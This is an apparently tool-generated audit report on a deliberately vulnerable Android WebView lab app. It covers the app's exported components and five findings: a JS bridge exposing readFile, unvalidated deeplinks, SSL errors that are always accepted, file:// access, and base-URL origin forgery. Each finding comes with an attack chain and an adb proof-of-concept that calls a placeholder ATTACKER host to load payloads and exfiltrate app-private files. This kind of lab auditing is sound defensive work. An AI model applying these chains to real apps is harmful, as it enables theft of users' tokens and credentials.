# droid-recon — ma.poneglyph.webviewlab

> Historical sample from an earlier, developer-owned lab audit. It was not rerun with the current development snapshot, and the underlying APK/device evidence bundle is not included here. Treat the reported effects and severity as an example of the earlier workflow, not as current-version validation.

**Triage:** INVESTIGATE — 13 third-party-reachable, browsable, debuggable, 24 sink hits

## Attack surface

- Components: **15** (13 activities, 0 services, 1 receivers, 1 providers)
- Exported: **14**
- **Reachable by a third-party app or the browser: 13** ← the only ones an attacker actually has
- Flags: debuggable, has_browsable

### Application-level issues

- android:debuggable=true — any local process can attach a debugger
- usesCleartextTraffic=true — plaintext HTTP permitted
- networkSecurityConfig: cleartextTrafficPermitted=true — plaintext HTTP allowed

### Third-party-reachable components

| Component | Type | Reach | Guard | Issues |
|---|---|---|---|---|
| `DeepLinkSinkActivity` | activity | browser | — | exported activity with no permission guard; BROWSABLE — reachable from a web page via an <a href> / iframe |
| `MainActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `StockWebViewActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `WebViewCompatActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `JsBridgeActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `FileAccessActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `MixedContentActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `UniversalAccessActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `CustomTabsActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `WebMessageListenerActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `InterceptRequestActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `BaseUrlInjectionActivity` | activity | third_party_app | — | exported activity with no permission guard |
| `SslErrorActivity` | activity | third_party_app | — | exported activity with no permission guard |

## Code sweep

- Files scanned: 3004
- Sink hits: 124 (**24 outside bundled libraries**)
- Source hits: 42 (18 outside libraries)

### Sinks inside exported components

- `ma/poneglyph/webviewlab/flavors/StockWebViewActivity.java:86` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra); webView.loadUrl(stringExtra); } }`
- `ma/poneglyph/webviewlab/flavors/FileAccessActivity.java:52` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra); webView.loadUrl(stringExtra); } }`
- `ma/poneglyph/webviewlab/flavors/FileAccessActivity.java:29` — **setAllowFileAccessFromFileURLs(true)**
  `s().setAllowFileAccess(true); webView.getSettings().setAllowFileAccessFromFileURLs(true); webView.getSettings().setAllowContentAccess(true)`
- `ma/poneglyph/webviewlab/flavors/FileAccessActivity.java:27` — **WebView JavaScript enabled**
  `) findViewById(R.id.webview); webView.getSettings().setJavaScriptEnabled(true); webView.getSettings().setAllowFileAccess(true);`
- `ma/poneglyph/webviewlab/flavors/SslErrorActivity.java:51` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra); webView.loadUrl(stringExtra); } }`
- `ma/poneglyph/webviewlab/flavors/SslErrorActivity.java:28` — **WebView JavaScript enabled**
  `) findViewById(R.id.webview); webView.getSettings().setJavaScriptEnabled(true); webView.setWebViewClient(new WebViewClient() { //`
- `ma/poneglyph/webviewlab/flavors/WebMessageListenerActivity.java:78` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra2); webView.loadUrl(stringExtra2); } }`
- `ma/poneglyph/webviewlab/flavors/WebMessageListenerActivity.java:55` — **WebView JavaScript enabled**
  `) findViewById(R.id.webview); webView.getSettings().setJavaScriptEnabled(true); webView.getSettings().setAllowFileAccess(true);`
- `ma/poneglyph/webviewlab/flavors/WebViewCompatActivity.java:64` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra); webView.loadUrl(stringExtra); } }`
- `ma/poneglyph/webviewlab/flavors/InterceptRequestActivity.java:67` — **WebView.loadUrl**
  `Log.i(this.tag, "loading " + stringExtra); webView.loadUrl(stringExtra); } }`
- `ma/poneglyph/webviewlab/flavors/InterceptRequestActivity.java:39` — **WebView.evaluateJavascript**
  `ity.this.tag, "onPageFinished " + url); view.evaluateJavascript("var s=document.createElement('script');s.src='/pwned.js';do`
- `ma/poneglyph/webviewlab/flavors/InterceptRequestActivity.java:32` — **WebView JavaScript enabled**
  `) findViewById(R.id.webview); webView.getSettings().setJavaScriptEnabled(true); webView.setWebViewClient(new WebViewClient() { //`

## Findings (5)

### F001 — Remote web page steals app-private files via exposed JavaScript bridge (deeplink -> WebView -> AndroidBridge.readFile)

**CRITICAL** · remote-one-click · reach: `browser` · confidence 95% · CWE-749: Exposed Dangerous Method or Function (+ CWE-200 exfiltration)

**Component:** `ma.poneglyph.webviewlab.flavors.DeepLinkSinkActivity -> .flavors.JsBridgeActivity` (activity)

**Chain:**

1. Victim opens an attacker link (or any page that redirects/iframes to it) — no install, no permission, no prompt
2. ma.poneglyph.webviewlab/.flavors.DeepLinkSinkActivity is exported and BROWSABLE (webviewlab://open, https://webviewlab.poneglyph.ma/open)
3. It reads ?flavor= and ?url= from the URI and routes to any of 11 WebView activities, forwarding the attacker URL as EXTRA_URL
4. JsBridgeActivity enables JavaScript and calls addJavascriptInterface(VulnerableJsBridge, "AndroidBridge") with NO origin restriction, then loadUrl(attacker_url)
5. Attacker JavaScript now runs with the bridge in scope and calls AndroidBridge.readFile('/data/data/ma.poneglyph.webviewlab/shared_prefs/secrets.xml')
6. readFile executes as the app UID, bypassing the file's 0600 app-only permissions
7. The contents are exfiltrated to the attacker's server via an image/fetch request

**PoC:** `adb shell am start -a android.intent.action.VIEW -d 'webviewlab://open?flavor=jsbridge&url=http://ATTACKER/evil.html'`

**Impact:** Any web page can read ANY file the app can read — session tokens, credentials, databases, cached PII — and send it off-device. The bridge also exposes fireIntent() (arbitrary Intent from JS), eval() and getDeviceId(). No user interaction beyond opening a link; no permissions required. VERIFIED: an app-private file owned by u0_a192 with mode 0600 was exfiltrated to an attacker-controlled host.

### F002 — Exported BROWSABLE deeplink loads an arbitrary attacker URL into 11 different WebViews

**HIGH** · remote-one-click · reach: `browser` · confidence 95% · CWE-939: Improper Authorization in Handler for Custom URL Scheme

**Component:** `ma.poneglyph.webviewlab.flavors.DeepLinkSinkActivity` (activity)

**Chain:**

1. Attacker page links to webviewlab://open?flavor=<any>&url=<any>
2. DeepLinkSinkActivity performs NO validation of flavor, url, baseUrl, html or origins
3. The attacker picks BOTH the destination component and the content it loads
4. This is the delivery mechanism for F001, F003, F004 and F005

**PoC:** `adb shell am start -a android.intent.action.VIEW -d 'webviewlab://open?flavor=universal&url=http://ATTACKER/x.html'`

**Impact:** A single link gives an attacker control of which of 11 WebView configurations is used and what content it loads — including the JS-bridge, universal-file-access and SSL-bypass variants. This is the enabling primitive for every other finding here.

### F003 — WebView accepts ANY invalid TLS certificate (onReceivedSslError -> proceed())

**HIGH** · remote-one-click · reach: `browser` · confidence 95% · CWE-295: Improper Certificate Validation

**Component:** `ma.poneglyph.webviewlab.flavors.SslErrorActivity` (activity)

**Chain:**

1. The handler calls proceed() for EVERY SSL error — expired, self-signed, wrong host, untrusted CA
2. Any on-path attacker presents their own certificate and the WebView accepts it
3. Attacker controls the page content, and JavaScript is enabled
4. Reachable remotely via the deeplink (F002), so the attacker also chooses the target URL

**PoC:** `adb shell am start -a android.intent.action.VIEW -d 'webviewlab://open?flavor=ssl&url=https://expired.badssl.com/'`

**Impact:** Complete loss of transport security for this WebView. An on-path attacker reads and rewrites all traffic, injects JavaScript, and steals anything the page handles — no certificate pinning to defeat, no user warning shown.

### F004 — Remote deeplink loads app-private files into a WebView with file:// origin access enabled

**HIGH** · remote-one-click · reach: `browser` · confidence 90% · CWE-200: Exposure of Sensitive Information

**Component:** `ma.poneglyph.webviewlab.flavors.FileAccessActivity` (activity)

**Chain:**

1. Attacker link supplies url=file:///data/data/<pkg>/shared_prefs/secrets.xml
2. FileAccessActivity does not validate the scheme and loads it
3. The WebView runs as the app UID, so app-private 0600 files are readable
4. setAllowFileAccessFromFileURLs(true) additionally lets JavaScript on a file:// page read OTHER local files
5. Content is exfiltrated with a normal XHR/fetch to the attacker

**PoC:** `adb shell am start -a android.intent.action.VIEW -d 'webviewlab://open?flavor=file&url=file:///data/data/ma.poneglyph.webviewlab/shared_prefs/secrets.xml'`

**Impact:** Discloses app-private storage — tokens, credentials, databases — to a remote attacker who only needs the victim to open a link.

### F005 — Attacker HTML executes under a forged origin with universal file access (loadDataWithBaseURL)

**HIGH** · remote-one-click · reach: `browser` · confidence 90% · CWE-346: Origin Validation Error

**Component:** `ma.poneglyph.webviewlab.flavors.UniversalAccessActivity` (activity)

**Chain:**

1. Attacker supplies both the HTML and the base URL in one link
2. loadDataWithBaseURL runs that HTML AS IF it came from the chosen origin
3. The attacker's script now holds the origin of any site they name — reading its cookies/localStorage and issuing same-origin requests
4. setAllowUniversalAccessFromFileURLs(true) removes the remaining cross-origin restriction, including to file://

**PoC:** `adb shell am start -a android.intent.action.VIEW -d 'webviewlab://open?flavor=universal&baseUrl=https://bank.example.com/&html=<script>...</script>'`

**Impact:** Attacker JavaScript runs with an origin of the attacker's choosing, defeating the same-origin policy: session data for the impersonated site is readable, and universal file access extends this to local files.

## Artifacts

- `attack_surface`: sessions/ma.poneglyph.webviewlab/attack_surface.json
- `code_report`: sessions/ma.poneglyph.webviewlab/code_report.json
- `observations`: sessions/ma.poneglyph.webviewlab/observations.jsonl
- `findings`: sessions/ma.poneglyph.webviewlab/findings.jsonl
- `dead_ends`: sessions/ma.poneglyph.webviewlab/dead-ends.md
- `screenshots`: sessions/ma.poneglyph.webviewlab/screenshots
- `storage`: sessions/ma.poneglyph.webviewlab/storage
- `log`: sessions/ma.poneglyph.webviewlab/session.log
